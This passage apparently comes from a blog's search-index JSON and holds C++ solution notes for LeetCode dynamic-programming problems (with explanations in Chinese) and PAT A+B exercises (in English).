m; for (auto &amp;x : strs) { string temp = x; sort(x.begin(), x.end()); m[x].push_back(temp); } vector&lt;vector&lt;string&gt;&gt; ans; for (auto &amp;x : m) { ans.push_back(x.second); } return ans; }}; 80. 删除排序数组中的重复项 II思路双指针遍历一遍数组， AC代码123456789101112131415class Solution { public: int removeDuplicates(vector&lt;int&gt; &amp;nums) { int i = 0, j = 0; int len = nums.size(); while (i &lt; len) { if (j &lt; 2 || nums[i] &gt; nums[j - 2]) { int n = nums[i]; nums[j++] = n; } i++; } return j; }};","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%939/"},{"title":"LeetCode-dp","text":"leetcode 101的动态规划专题 基本动态规划：一维70. 爬楼梯12345678910111213class Solution {public: int climbStairs(int n) { int a=1,b=2; if(n&lt;2) return 1; for(int i = 2; i &lt;n ; i++) { int c = a+b; a=b; b=c; } return b; }}; dp数组表示上n层楼有几种可能转移方程是 $ dp[i] = dp[i-1] + dp[i-2] $上到第i层有可能从第i-1层或i-2层上来，则上到i层的可能数目就是 $ dp[i-1] + dp[i-2] $由于dp[i]只需要前两个数的数据，所以可以优化掉dp数组，用两个变量代替，节省数组空间 198. 打家劫舍状态记录1234567891011121314151617class Solution {public: int n; vector&lt;int&gt; mem; int rob(vector&lt;int&gt;&amp; nums) { this-&gt;n = nums.size(); mem = vector&lt;int&gt;(n+2, -1); return maxRob(nums, -2); } int maxRob(const vector&lt;int&gt;&amp; nums, int i) { if(i &lt; n &amp;&amp; mem[i+2] != -1) return mem[i+2]; int a = (i+2 &lt; n ? maxRob(nums, i+2) + nums[i+2] : 0); int b = (i+3 &lt; n ? maxRob(nums, i+3) + nums[i+3] : 0); mem[i+2] = (a &gt; b? a : b); return mem[i+2]; }}; 这是之前实习时写的代码思路不是dp，而是自上而下的带有状态记录的优先搜索思路相同，就是，若打劫i，则一定不能打劫i+1，考虑是打劫i+2还是i+3状态转移方程 $ dp[i] = nums[i] + max(dp[i+2], dp[i+3]) $ dp12345678910111213141516171819class Solution {public: int rob(vector&lt;int&gt;&amp; nums) { int len = nums.size(); vector&lt;int&gt; dp(len); if(len == 1) { return nums[len-1]; } else if(len == 2) { return max(nums[len-1], nums[len-2]); } dp[len-1] = nums[len-1]; dp[len-2] = max(nums[len-1], nums[len-2]); dp[len-3] = max(nums[len-2], nums[len-3] + dp[len-1]); for(int i = len-4; i &gt;= 0; i--) { dp[i] = nums[i] + max(dp[i+3], dp[i+2]); } return max(dp[0], dp[1]); }}; 由于第0家可以打劫，也可以跳过，所以最终结果是 $ max(dp[0], dp[1]) $ 同上，也可以优化存储空间 1234567891011121314151617class Solution {public: int rob(vector&lt;int&gt;&amp; nums) { int len = nums.size(); if(len == 1) { return nums[len-1]; } else if(len == 2) { return max(nums[len-1], nums[len-2]); } int a = nums[len-1],b = max(nums[len-1], nums[len-2]), c = max(nums[len-2], nums[len-3] + nums[len-1]); for(int i = len-4; i &gt;= 0; i--) { int d = nums[i] + max(a, b); a = b;b = c;c = d; } return max(b, c); }}; 121. 买卖股票的最佳时机1234567891011121314151617class Solution {public: int maxProfit(vector&lt;int&gt;&amp; prices) { int len = prices.size(); int minPos = len-1; int maxx = prices[len-1]; int maxx1 = prices[len-1]; for(int i = len-2; i &gt;= 0; i--) { maxx1 = max(prices[i], maxx1); if(maxx1 - prices[i] &gt; maxx - prices[minPos]) { minPos = i; maxx = maxx1; } } return maxx - prices[minPos]; }}; 记maxx数组中 $ maxx[i] $ 表示 $ max(prices[j]); j = i,i+1,…,n-1 $假设在第i天买入，则应该在第i天后售价最高的一天卖出，也就是 $ maxx[i] $再把maxx数组优化掉 413. 等差数列划分1234567891011121314151617181920212223242526class Solution {public: int numberOfArithmeticSlices(vector&lt;int&gt;&amp; nums) { int len = nums.size(); if(len &lt; 3) return 0; int i = 2; int ans = 0; int count = 2; while(i &lt; len) { while(i &lt; len &amp;&amp; nums[i] - nums[i-1] == nums[i-1] - nums[i-2]) { i++; count++; } if(count &gt;= 3) { ans += (count-2)*(count-1)/2; } if(i &lt; len-1) { i += 1; count = 2; } else { break; } } return ans; }}; 由于求的是连续子数组中为等差数列的个数，可以把nums看作多个公差不同的等差数列拼接在一起只需要找到每段最长的等差数列，计算它有多少个子等差数列也就是 $$ \\sum_{i=3}^n(n+1-i) = (n-2) \\times (n-1)/2 $$ 其中n是等差数列的长度。应该没有用dp的思想吧？ dp版1234567891011int numberOfArithmeticSlices(vector&lt;int&gt;&amp; nums) { int n = nums.size(); if (n &lt; 3) return 0; vector&lt;int&gt; dp(n, 0); for (int i = 2; i &lt; n; ++i) { if (nums[i] - nums[i-1] == nums[i-1] - nums[i-2]) { dp[i] = dp[i-1] + 1; } } return accumulate(dp.begin(), dp.end(), 0);} 举个例子可以看出若nums = [1,2,3,4,5,7,9,11]则dp = [0,0,1,2,3,0,1,2]一个等差数列中的 $ \\sum(dp[i]) $ 和我上面分析的 $ \\sum(n+1-i) $ 一样的 基本动态规划：二维64. 最小路径和12345678910111213141516171819class Solution {public: int minPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int m = grid.size(); int n = grid[0].size(); for(int i = 1; i &lt; m; i++) { grid[i][0] += grid[i-1][0]; } for(int i = 1; i &lt; n; i++) { grid[0][i] += grid[0][i-1]; } for(int i = 1; i &lt; m; i++) { for(int j = 1; j &lt; n; j++) { grid[i][j] += min(grid[i-1][j], grid[i][j-1]); } } return grid[m-1][n-1]; }}; 比较好想，因为只能向右或向下走，那么 对于 $ grid[i][j] (i &gt; 0 , j &gt; 0) $ ， 到达它的最短路径是 $ grid[i][j] + min(grid[i-1][j], grid[i][j-1]) $ 对于 $ grid[i][j] (i = 0 , j &gt; 0) $ ， 到达它的最短路径是 $ grid[i][j] + grid[i][j-1] $ 对于 $ grid[i][j] (i &gt; 0 , j = 0) $ ， 到达它的最短路径是 $ grid[i][j] + grid[i-1][j] $ dp数组压缩12345678910111213141516171819class Solution {public: int minPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int m = grid.size(); int n = grid[0].size(); vector&lt;int&gt; dp(n); dp[0] = grid[0][0]; for(int i = 1; i &lt; n; i++) { dp[i] = grid[0][i] + dp[i-1]; } for(int i = 1; i &lt; m; i++) { dp[0] += grid[i][0]; for(int j = 1; j &lt; n; j++) { dp[j] = grid[i][j] + min(dp[j], dp[j-1]); } } return dp[n-1]; }}; 每次只更新同一行也是可以的，因为每次只需要左边的和上一行的，其他的不需要 542. 01 矩阵未ac代码1234567891011121314151617181920212223242526272829303132333435363738394041class Solution {public: vector&lt;vector&lt;int&gt;&gt; updateMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; mat) { int m = mat.size(), n = mat[0].size(); vector&lt;vector&lt;int&gt;&gt; ans(m, vector&lt;int&gt;(n, 20000)); for(int i = 0; i &lt; m; i++) { for(int j = 0; j &lt; n; j++) { if(mat[i][j] == 0) { ans[i][j] = 0; } if(i-1 &gt;= 0) { ans[i][j] = min(ans[i-1][j]+1, ans[i][j]); } if(j-1 &gt;= 0) { ans[i][j] = min(ans[i][j-1]+1, ans[i][j]); } if(i+1 &lt; m) { ans[i][j] = min(ans[i+1][j]+1, ans[i][j]); } if(j+1 &lt; n) { ans[i][j] = min(ans[i][j+1]+1, ans[i][j]); } if(i-1 &gt;= 0) { ans[i-1][j] = min(ans[i-1][j], 1 + ans[i][j]); } if(j-1 &gt;= 0) { ans[i][j-1] = min(ans[i][j-1], 1 + ans[i][j]); } if(i+1 &lt; m) { ans[i+1][j] = min(ans[i+1][j], 1 + ans[i][j]); } if(j+1 &lt; n) { ans[i][j+1] = min(ans[i][j+1], 1 + ans[i][j]); } } } return ans; }}; 这个的想法和答案已经很接近了，但我只从一个方向上进行了更新，应该从四个角开始分别进行更新一次 ac代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Solution {public: vector&lt;vector&lt;int&gt;&gt; updateMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) { int m = matrix.size(), n = matrix[0].size(); vector&lt;vector&lt;int&gt;&gt; dist(m, vector&lt;int&gt;(n, INT_MAX / 2)); for (int i = 0; i &lt; m; ++i) { for (int j = 0; j &lt; n; ++j) { if (matrix[i][j] == 0) { dist[i][j] = 0; } } } for (int i = 0; i &lt; m; ++i) { for (int j = 0; j &lt; n; ++j) { if (i - 1 &gt;= 0) { dist[i][j] = min(dist[i][j], dist[i - 1][j] + 1); } if (j - 1 &gt;= 0) { dist[i][j] = min(dist[i][j], dist[i][j - 1] + 1); } } } for (int i = m - 1; i &gt;= 0; --i) { for (int j = 0; j &lt; n; ++j) { if (i + 1 &lt; m) { dist[i][j] = min(dist[i][j], dist[i + 1][j] + 1); } if (j - 1 &gt;= 0) { dist[i][j] = min(dist[i][j], dist[i][j - 1] + 1); } } } for (int i = 0; i &lt; m; ++i) { for (int j = n - 1; j &gt;= 0; --j) { if (i - 1 &gt;= 0) { dist[i][j] = min(dist[i][j], dist[i - 1][j] + 1); } if (j + 1 &lt; n) { dist[i][j] = min(dist[i][j], dist[i][j + 1] + 1); } } } for (int i = m - 1; i &gt;= 0; --i) { for (int j = n - 1; j &gt;= 0; --j) { if (i + 1 &lt; m) { dist[i][j] = min(dist[i][j], dist[i + 1][j] + 1); } if (j + 1 &lt; n) { dist[i][j] = min(dist[i][j], dist[i][j + 1] + 1); } } } return dist; }}; 101 其实从左上和右下两个方向就可以了 1234567891011121314151617181920212223242526272829303132vector&lt;vector&lt;int&gt;&gt; updateMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) { if (matrix.empty()) return {}; int n = matrix.size(), m = matrix[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(n, vector&lt;int&gt;(m, INT_MAX - 1)); for (int i = 0; i &lt; n; ++i) { for (int j = 0; j &lt; m; ++j) { if (matrix[i][j] == 0) { dp[i][j] = 0; } else { if (j &gt; 0) { dp[i][j] = min(dp[i][j], dp[i][j-1] + 1); } if (i &gt; 0) { dp[i][j] = min(dp[i][j], dp[i-1][j] + 1); } } } } for (int i = n - 1; i &gt;= 0; --i) { for (int j = m - 1; j &gt;= 0; --j) { if (matrix[i][j] != 0) { if (j &lt; m - 1) { dp[i][j] = min(dp[i][j], dp[i][j+1] + 1); } if (i &lt; n - 1) { dp[i][j] = min(dp[i][j], dp[i+1][j] + 1); } } } } return dp;} 221. 最大正方形1234567891011121314151617181920212223242526272829class Solution {public: int maximalSquare(vector&lt;vector&lt;char&gt;&gt;&amp; matrix) { int m = matrix.size(); if(m &lt;= 0) return 0; int n = matrix[0].size(); if(n &lt;= 0) return 0; int maxx = 0; vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0)); for(int i = m-1; i &gt;= 0; i--) { dp[i][n-1] = matrix[i][n-1] - '0'; maxx = max(maxx, dp[i][n-1]); } for(int i = n-1; i &gt;= 0; i--) { dp[m-1][i] = matrix[m-1][i] - '0'; maxx = max(maxx, dp[m-1][i]); } for(int i = m-2; i &gt;= 0; i--) { for(int j = n-2; j &gt;= 0; j--) { if(matrix[i][j] != '0') { int x = min(dp[i][j+1], min(dp[i+1][j], dp[i+1][j+1])); dp[i][j] = 1 + x + 2*sqrt(x); maxx = max(maxx, dp[i][j]); } } } return maxx; }}; 从右下角到左上角，dp表示以(i, j)为左上角顶点的最大正方形大小看点(i+1, j) (i, j+1) (i+1, j+1)三个点的最小值，在最小值的基础上增加一圈也就是边长+1，由于dp[i][j]表示的是面积， $ dp[i][j] = (sqrt(min)+1)^2 = min + 2 \\times sqrt(min) + 1 $在计算过程中记录max(dp[i][j]) 分割类型题279. 完全平方数12345678910111213141516class Solution {public: int numSquares(int n) { vector&lt;int&gt; dp(n+1, 0); for(int i = 1; i &lt;= n; i++) { int min = INT_MAX-1; for(int j = 1; i-j*j &gt;= 0; j++) { if(dp[i-j*j] &lt; min) { min = dp[i - j*j]; } } dp[i] = min+1; } return dp[n]; }}; dp[i]保存数字i的最少平方数之和，假设 $ i $ 由 $ j \\times j $ 和 $ i - j \\times j $ 相加而得，那么$$ dp[i] = min_{ j=1 }^{ \\sqrt i }(dp[i-j \\times j]) + 1 $$ 91. 解码方法123456789101112131415class Solution {public: int numDecodings(string s) { s = &quot;(&quot; + s + &quot;)&quot;; int n = s.size(); vector&lt;int&gt; dp(n, 0); dp[n-2] = 1; for(int i = n-3; i &gt;= 0; i--) { int number = s[i+1]*10 + s[i+2] - '0'*11; int number1 = s[i+1] - '0'; dp[i] = ((number &gt;= 10 &amp;&amp; number &lt;= 26) ? dp[i+2] : 0) + ((number1 &gt;= 1 &amp;&amp; number1 &lt;= 9) ? dp[i+1] : 0); } return dp[0]; }}; 在两个数之间添加隔板，并计算两个隔板之间数字是否合法dp[i]表示在数字i后添加一个隔板后，s[i…n-1]共有几种插入隔板的方式如果s[i+1]在1到9之间，则可以在i+1后加入一个隔板如果s[i+1…i+2]在10到26之间，则可以在i+1后不插入隔板而在i+2后加入隔板考虑到隔一个或两个数插入一个隔板，不需要考虑字符串更长的情况则转移方程为$ dp[i] = dp[i+1] + dp[i+2] \\quad if \\quad 1&lt;=s[i+1]&lt;=9 \\quad and \\quad 10&lt;=s[i+1…i+2]&lt;=26 $$ dp[i] = dp[i+2] \\quad if \\quad not \\quad 1&lt;=s[i+1]&lt;=9 \\quad and \\quad 10&lt;=s[i+1…i+2]&lt;=26 $$ dp[i] = dp[i+1] \\quad if \\quad 1&lt;=s[i+1]&lt;=9 \\quad and \\quad not \\quad 10&lt;=s[i+1…i+2]&lt;=26 $$ dp[i] = 0 \\quad if \\quad not \\quad 1&lt;=s[i+1]&lt;=9 \\quad and \\quad not \\quad 10&lt;=s[i+1…i+2]&lt;=26 $在s前后加入括号是为了避免反复写重复的逻辑，否则代码很冗余 123456789101112131415161718192021class Solution {public: int numDecodings(string s) { int n = s.size(); vector&lt;int&gt; dp(n, 0); if(n &lt; 1) return n; if(n == 1) return s[0] == '0' ? 0 : 1; int number = (s[n-2] - '0')*10 + (s[n-1] - '0'); int number1 = (s[n-1] - '0'); dp[n-1] = 1; dp[n-2] = ((number1 &gt;= 1 &amp;&amp; number1 &lt;= 9) ? dp[n-1] : 0); for(int i = n-3; i &gt;= 0; i--) { number = (s[i+1] - '0')*10 + (s[i+2] - '0'); number1 = (s[i+1] - '0'); dp[i] = ((number &gt;= 10 &amp;&amp; number &lt;= 26) ? dp[i+2] : 0) + ((number1 &gt;= 1 &amp;&amp; number1 &lt;= 9) ? dp[i+1] : 0); } number = (s[0] - '0')*10 + (s[1] - '0'); number1 = (s[0] - '0'); return ((number &gt;= 10 &amp;&amp; number &lt;= 26) ? dp[1] : 0) + ((number1 &gt;= 1 &amp;&amp; number1 &lt;= 9) ? dp[0] : 0); }}; 139. 单词拆分12345678910111213141516171819202122232425262728class Solution {public: bool wordBreak(string s, vector&lt;string&gt;&amp; wordDict) { unordered_map&lt;string, bool&gt; dict; for(string&amp; s : wordDict) { dict[s] = true; } int len = s.size(); vector&lt;int&gt; dp(len+1,0); dp[0] = 1; for(int i = 1; i &lt;= len; i++) { int j = i-1; bool flag = false; while(j &gt;= 0 &amp;&amp; !flag) { flag = dict[s.substr(dp[j]-1, i - dp[j] + 1)]; if(flag) break; while(j &gt; 0 &amp;&amp; dp[j-1] == dp[j]) j--; j--; } if(flag) { dp[i] = i+1; } else { dp[i] = dp[i-1]; } } return dp[len] == len+1; }}; 还是分割问题思路是判断在位置i之前插入一个隔板，用dp[i]记录最近一次匹配到字典中的单词的位置如leetcode， 对于 l,le,lee, 都没有匹配到，那么dp[i] = 0leet匹配到了，dp[i] = 4，通过dp[i-1]就可以知道要匹配 0-4的字串leetc,leetco,leetcod, 根据 dp[i-1] = 4，发现c，co，cd都不是字典中的串,dp[i] = dp[i-1];leetcode根据 dp[i-1] = 4，发现code是字串，那么dp[i] = i+1;最后检查dp[len]是否等于len + 1 上面的思路的一个问题是，对于字典中，子串也在字典内的串，不能只根据dp[i-1]决定子串范围要看dp[0]到dp[i-1]所有子串 1011234567891011121314151617class Solution {public: bool wordBreak(string s, vector&lt;string&gt;&amp; wordDict) { int len = s.size(); vector&lt;bool&gt; dp(len, false); dp[0] = true; for(int i = 0; i &lt;= len; i++) { for(string&amp; w : wordDict) { int length = w.size(); if(i &gt;= length &amp;&amp; w == s.substr(i-length, length)) { dp[i] = dp[i] || dp[i-length]; } } } return dp[len]; }}; 子序列问题300. 最长递增子序列123456789101112131415161718class Solution {public: int lengthOfLIS(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; dp(n, 1); for(int i = 1; i &lt; n; i++) { int maxx = 0; for(int j = i-1; j &gt;= 0; j--) { if(nums[i] &gt; nums[j]) { dp[i] += dp[j]; break; } } dp[i] += maxx; } return *max_element(dp.begin(), dp.end()); }}; 这是最简单的方法，还可以用类似单调栈优化 1234567891011121314151617181920212223242526class Solution {public: int lengthOfLIS(vector&lt;int&gt;&amp; nums) { int n = nums.size(); if(n &lt;= 1) return n; vector&lt;int&gt; dp(n); dp[0] = nums[0]; int count = 1; for(int i = 1; i &lt; n; i++) { if(dp[count-1] &lt; nums[i]) { dp[count] = nums[i]; count++; } else { int pos = -1; for(int j = count-1; j &gt;= 0; j--) { if(dp[j] &lt; nums[i]) { pos = j; break; } } dp[pos+1] = nums[i]; } } return count; }}; 1143. 最长公共子序列1234567891011121314151617181920class Solution {public: int longestCommonSubsequence(string text1, string text2) { int m = text2.size(), n = text1.size(); vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n)); dp[0][0] = text1[0] == text2[0]; for(int i = 1; i &lt; m; i++) { dp[i][0] = max(dp[i-1][0], int(text1[0] == text2[i]) ); } for(int i = 1; i &lt; n; i++) { dp[0][i] = max(dp[0][i-1] , int(text1[i] == text2[0])); } //初始化 for(int i = 1; i &lt; m; i++) { for(int j = 1; j &lt; n; j++) { dp[i][j] = max(dp[i-1][j-1] + (text1[j] == text2[i]), max(dp[i-1][j], dp[i][j-1])); } } return dp[m-1][n-1]; }}; 稍微看了一下答案， $ dp[i][j] $ 表示遍历到 $ text1[i] $ , $ text2[j] $ 为止，最长子序列是多少 背包问题板子0-1背包123456789101112131415int knapsack(vector&lt;int&gt; weights, vector&lt;int&gt; values, int N, int W) { vector&lt;vector&lt;int&gt;&gt; dp(N + 1, vector&lt;int&gt;(W + 1, 0)); for (int i = 1; i &lt;= N; ++i) { int w = weights[i - 1], v = values[i - 1]; for (int j = 1; j &lt;= W; ++j) { if (j &gt;= w) { dp[i][j] = max(dp[i - 1][j], dp[i - 1][j - w] + v); } else { dp[i][j] = dp[i - 1][j]; } } } return dp[N][W];} 用自己的话说，问题就是有n种物品，每种物品有1个，背包有总容量限制，每种物品有一定价值。怎样装入物品，在容量限制下，尽量让背包价值最大$ dp[i][j] $ 表示当遍历到第i个物品时，背包容量为j时（可以不满），背包的最大价值所以状态转移函数是$$dp[i][j] = max(dp[i - 1][j], dp[i - 1][j - w_{i-1}] + v_{i-1}), \\quad j&gt;=w_{i-1} $$$$dp[i][j] = dp[i - 1][j], \\quad j &lt; w_{i-1}$$ 0-1背包的压缩 12345678910int knapsack(vector&lt;int&gt; weights, vector&lt;int&gt; values, int N, int W) { vector&lt;int&gt; dp(W + 1, 0); for (int i = 1; i &lt;= N; ++i) { int w = weights[i - 1], v = values[i - 1]; for (int j = W; j &gt;= w; --j) { dp[j] = max(dp[j], dp[j - w] + v); } } return dp[W];} 完全背包123456789101112131415int knapsack(vector&lt;int&gt; weights, vector&lt;int&gt; values, int N, int W) { vector&lt;vector&lt;int&gt;&gt; dp(N + 1, vector&lt;int&gt;(W + 1, 0)); for (int i = 1; i &lt;= N; ++i) { int w = weights[i - 1], v = values[i - 1]; for (int j = 1; j &lt;= W; ++j) { if (j &gt;= w) { dp[i][j] = max(dp[i - 1][j], dp[i][j - w] + v); } else { dp[i][j] = dp[i - 1][j]; } } } return dp[N][W];} 和0-1背包不同的是，每个物品有无限个，因此也需要正向遍历，且状态转移函数中，应该是同列中+物品价值，这样才能向背包中放入多个物品状态转移函数是$$dp[i][j] = max(dp[i - 1][j], dp[i][j - w_{i-1}] + v_{i-1}), \\quad j&gt;=w_{i-1} $$$$dp[i][j] = dp[i - 1][j], \\quad j &lt; w_{i-1}$$ 完全背包的空间压缩12345678910int knapsack(vector&lt;int&gt; weights, vector&lt;int&gt; values, int N, int W) { vector&lt;int&gt; dp(W + 1, 0); for (int i = 1; i &lt;= N; ++i) { int w = weights[i - 1], v = values[i - 1]; for (int j = w; j &lt;= W; ++j) { dp[j] = max(dp[j], dp[j - w] + v); } } return dp[W];} 101书中说 “0-1 背包对物品的迭代放在外层，里层的体积或价值逆向遍历；完全背包对物品的迭代放在里层，外层的体积或价值正向遍历。” 但我认为，完全背包正向遍历体积，0-1背包反向遍历体积，内层和外层遍历物品还是容量并没有影响 416. 分割等和子集1234567891011121314151617class Solution {public: bool canPartition(vector&lt;int&gt;&amp; nums) { int sum = accumulate(nums.begin(), nums.end(), 0); if(sum &amp; 1) return false; int target = sum/2; int n = nums.size(); vector&lt;int&gt; dp(target+1, 0); for(int i = 1; i &lt;= n; i++) { int w = nums[i-1], v = nums[i-1]; for(int j = target; j&gt;=w; j--) { dp[j] = max(dp[j], dp[j-w] + v); } } return dp[target] == sum-target; }}; 看了一眼答案的思路，知道背包总容量是 $ sum/2 $ 才写出来 101123456789101112131415161718class Solution {public: bool canPartition(vector&lt;int&gt;&amp; nums) { int sum = accumulate(nums.begin(), nums.end(), 0); if(sum &amp; 1) return false; int target = sum/2; int n = nums.size(); vector&lt;bool&gt; dp(target+1, false); dp[0] = true; for(int i = 1; i &lt;= n; i++) { int w = nums[i-1]; for(int j = target; j&gt;=w; j--) { dp[j] = dp[j] || dp[j-w]; } } return dp[target]; }}; 如果放入数nums[i]后，背包容量变成0了，那么说明可以装满背包 474. 一和零123456789101112131415161718class Solution {public: int findMaxForm(vector&lt;string&gt;&amp; strs, int m, int n) { int strnum = strs.size(); vector&lt;vector&lt;int&gt;&gt; dp(m+1, vector&lt;int&gt;(n+1, 0)); for(int i = 1; i &lt;= strnum; i++) { int strlen = strs[i-1].size(); int count0, count1 = accumulate(strs[i-1].begin(), strs[i-1].end(), -strlen*'0'); count0 = strlen-count1; for(int j = m; j &gt;= count0; j--) { for(int k = n; k &gt;= count1; k--) { dp[j][k] = max(dp[j][k], dp[j-count0][k-count1]+1); } } } return dp[m][n]; }}; 喵了一眼答案说要用二维背包，就写了，就过了但是还是晕晕的，感觉只是在套模板 322. 零钱兑换123456789101112131415161718192021class Solution {public: int coinChange(vector&lt;int&gt;&amp; coins, int amount) { int coinTypes = coins.size(); vector&lt;vector&lt;int&gt;&gt; dp(coinTypes+1, vector&lt;int&gt;(amount+1, 0)), dp1(coinTypes+1, vector&lt;int&gt;(amount+1, 0)); for(int i = 1; i &lt;= coinTypes; i++) { dp[i][0] = amount; int w = coins[i-1]; for(int j = 1; j &lt;= amount; j++) { if(j &gt;= w) { dp[i][j] = max(dp[i-1][j], dp[i][j-w]-1); dp1[i][j] = max(dp1[i-1][j], dp1[i][j-w]+w); } else { dp[i][j] = dp[i-1][j]; dp1[i][j] = dp1[i-1][j]; } } } return (dp1[coinTypes][amount] == amount) ? amount - dp[coinTypes][amount] : -1; }}; 太慢了，非常简单的想法，一个记录用了多少硬币，一个记录当前背包内总价值 空间压缩12345678910111213141516class Solution {public: int coinChange(vector&lt;int&gt;&amp; coins, int amount) { int coinTypes = coins.size(); vector&lt;int&gt; dp(amount+1, 0), dp1(amount+1, 0); dp[0] = amount; for(int i = 1; i &lt;= coinTypes; i++) { int w = coins[i-1]; for(int j = w; j &lt;= amount; j++) { dp[j] = max(dp[j], dp[j-w]-1); dp1[j] = max(dp1[j], dp1[j-w]+w); } } return (dp1[amount] == amount) ? amount - dp[amount] : -1; }}; 101123456789101112131415class Solution {public: int coinChange(vector&lt;int&gt;&amp; coins, int amount) { int coinTypes = coins.size(); vector&lt;int&gt; dp(amount+1, amount+1); dp[0] = 0; for(int i = 1; i &lt;= amount; i++) { for(int j = 1; j &lt;= coinTypes; j++) { int w = coins[j-1]; if(i &gt;= w) dp[i] = min(dp[i], dp[i-w]+1); } } return (dp[amount] == amount+1) ? -1 : dp[amount]; }}; 硬币的价值不用-1而用1，dp表示硬币数，找min，那么dp初值就不能是0无限背包，外层容量，内层物品, 这里没有理解如果dp[amount]是amount+1，说明没有填满，如果填满了，硬币数量一定小于amount+1 123456789101112131415class Solution {public: int coinChange(vector&lt;int&gt;&amp; coins, int amount) { int coinTypes = coins.size(); vector&lt;int&gt; dp(amount+1, amount+1); dp[0] = 0; for(int i = 1; i &lt;= coinTypes; i++) { int w = coins[i-1]; for(int j = w; j &lt;= amount; j++) { dp[j] = min(dp[j], dp[j-w]+1); } } return (dp[amount] == amount+1) ? -1 : dp[amount]; }}; 内层容量，外层物品也能过，还可以快一点 字符串编辑72. 编辑距离1234567891011121314151617181920class Solution {public: int minDistance(string word1, string word2) { int len1 = word1.size(), len2 = word2.size(); vector&lt;vector&lt;int&gt;&gt; dp(len1+1, vector&lt;int&gt;(len2+1, 0)); for(int i = 0; i &lt;= len1; i++) { dp[i][0] = i; } for(int i = 0; i &lt;= len2; i++) { dp[0][i] = i; } for(int i = 1; i &lt;= len1; i++) { for(int j = 1; j &lt;= len2; j++) { int x = int(word1[i-1] != word2[j-1]); dp[i][j] = min(x + dp[i-1][j-1], min(dp[i-1][j]+1, dp[i][j-1]+1)); } } return dp[len1][len2]; }}; 650. 只有两个键的键盘123456789101112131415class Solution {public: int minSteps(int n) { vector&lt;int&gt; dp(n+1, 0); for(int i = 2; i &lt;= n; i++) { dp[i] = i; for(int j = 2; j &lt;= i; j++) { if(i%j == 0) { dp[i] = min(dp[i], dp[j]+i/j); } } } return dp[n]; }}; 复杂度为 $ n^2 $ 123456789101112131415class Solution {public: int minSteps(int n) { vector&lt;int&gt; dp(n+1, 0); for(int i = 2; i &lt;= n; i++) { dp[i] = i; for(int j = 2; j*j &lt;= i; j++) { if(i%j == 0) { dp[i] = dp[j] + dp[i/j]; } } } return dp[n]; }}; 如果j 可以被i 整除，那么长度i 就可以由长度j 操作得到，其操作次数等价于把一个长度为1的A 延展到长度为i/j","link":"/home/2022/11/08/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93dp/"},{"title":"PTA-Advance-1001","text":"PROBLEMCalculate a+b and output the sum in standard format – that is, the digits must be separated into groups of three by commas (unless there are less than four digits). Input Specification:Each input file contains one test case. Each case contains a pair of integers a and b where $−10^6≤a,b≤10^6$. The numbers are separated by a space. Output Specification:For each test case, you should output the sum of a and b in one line. The sum must be written in the standard format. Sample Input:1-1000000 9 Sample Output:1-999,991 ACCEPTED CODE12345678910111213141516#include &lt;iostream&gt;using namespace std;int main () { int a, b; string ans; char temp[32] = {0}; scanf (&quot;%d%d&quot;, &amp;a, &amp;b); int c = a + b; sprintf(temp, &quot;%d&quot;, c); ans = temp; for (int i = ans.length() - 1, count = 1; i &gt; 0; i--, count++) if (count % 3 == 0 &amp;&amp; ans[i - 1] != '-') ans.insert(i, 1, ','); printf (&quot;%s&quot;, ans.data()); return 0;} THINKING AND NOTICE Insert a comma every 3 character. Traversal the string from the end of it. If the result of a+b is negative, check that there are no negative sign - before inserting a comma,. REFLECTION AND COMMENTS Relatively easy. Hope that I can stick to using English to write articles.","link":"/home/2019/07/13/PAT-(Advanced-Level)-Practice/1001-A+B-Format(PAT-(Advanced-Level)-Practice)/"},{"title":"PTA-Advance-1002","text":"PROBLEMThis time, you are supposed to find A+B where A and B are two polynomials. Input Specification:Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1,2,⋯,K) are the exponents and coefficients, respectively. It is given that 1≤K≤10，0≤NK&lt;⋯&lt;N2&lt;N1≤1000. Output Specification:For each test case you should output the sum of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place. Sample Input:122 1 2.4 0 3.22 2 1.5 1 0.5 Sample Output:13 2 1.5 1 2.9 0 3.2 ACCEPTED CODE1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;int main () { map&lt;int , double, greater&lt;int&gt;&gt; m; int k, count = 0; cin &gt;&gt; k; for (int i = 0; i &lt; k; i++) { double exp , cof; cin &gt;&gt; exp &gt;&gt; cof; m[exp] += cof; } cin &gt;&gt; k; for (int i = 0; i &lt; k; i++) { double exp , cof; cin &gt;&gt; exp &gt;&gt; cof; m[exp] += cof; if (m[exp] == 0) count++;//if this item is zero, count++ } printf (&quot;%d&quot;, m.size() - count);//print the nonzero item num, if result is zero, print zero for (map&lt;int, double&gt;::iterator ite = m.begin(); ite != m.end(); ite++) { if (ite-&gt;second != 0)//if this item is zero, do not print printf (&quot; %d %.1lf&quot;, ite-&gt;first, ite-&gt;second); } return 0;} THINKING AND NOTICES Creating a map from the exponents to coefficients. Add up the two coefficients of each exponents. Print a zero(the total number of nonzero items) if the result of a+b is zero. Map will sort your data by the keys in declining order, but you should print it in increasing order, so give map the third parameter – the class or struct name which has a member function like this:bool operator() (const double&amp; str1, const double&amp; str2);, a function (I’m not sure.) greater&lt;int&gt; ,or you can simply traversal the map from the end of it. REFLECTION AND COMMENT Noting to reflect.","link":"/home/2019/07/13/PAT-(Advanced-Level)-Practice/1002-A+B-for-Polynomials(PAT-(Advanced-Level)-Practice)/"},{"title":"PAT-Basic-1005","text":"题目 卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。 